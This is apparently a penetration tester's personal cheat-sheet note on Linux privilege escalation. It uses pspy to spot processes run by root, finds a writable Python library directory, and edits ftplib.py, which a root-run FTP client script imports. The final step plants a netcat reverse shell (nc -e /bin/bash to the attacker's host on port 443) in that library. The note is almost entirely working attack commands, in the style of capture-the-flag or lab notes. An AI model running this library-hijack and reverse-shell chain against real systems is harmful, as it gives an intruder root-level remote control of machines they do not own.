32 or 64?
```bash - target
uname -a
```
32 download
```bash - kali
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy32
```
64 download
```bash - kali
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
```
transfer to Target
![[Python#Server]]
```bash - target
chmod +x pspy64
```
Run with timeout for graceful exit!
```bash - kali
timeout 1m ./pspy64
```
Look at the output, look for any UID=0, as this is the root user.  Look for any commands that are calling a file / script that we may have write privileges to.
```bash - kali
find / -writable -type d 2>/dev/null
```
`/srv/ftp`
`/usr/lib/python2.7`
```bash - kali
cat /opt/ftpclient/ftpclient.py
```
```
import ftplib
...
```
```bash - kali
cd /usr/lib/python2.7
```
```bash - kali
ls -lah ftplib.py
```
`-rwxrw-r-- ftplib.py`
```bash - kali
nano ftplib.py
```
![[1._rlwrap]]
```python - kali
os.system("nc -e /bin/bash $KALI 443")
```
